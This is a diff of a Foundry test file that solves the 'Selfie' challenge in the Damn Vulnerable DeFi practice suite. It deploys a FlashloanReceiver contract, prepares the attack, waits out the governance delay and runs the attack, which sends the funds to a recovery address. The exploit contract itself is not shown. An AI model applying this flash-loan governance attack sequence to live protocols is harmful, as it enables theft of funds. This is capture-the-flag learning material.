@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {FlashloanReceiver} from "../../src/selfie/solution/FlashloanReceiver.sol";
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -18,6 +19,8 @@ contract SelfieChallenge is Test {
     DamnValuableVotes token;
     SimpleGovernance governance;
     SelfiePool pool;
+
+    FlashloanReceiver receiver;
 
     modifier checkSolvedByPlayer() {
         vm.startPrank(player, player);
@@ -62,7 +65,12 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        receiver = new FlashloanReceiver(address(governance), address(pool), address(token), recovery);
+        receiver.prepareAttack();
+
+        skip(governance.getActionDelay() + 1);
+
+        receiver.executeAttack();
     }
 
     /**
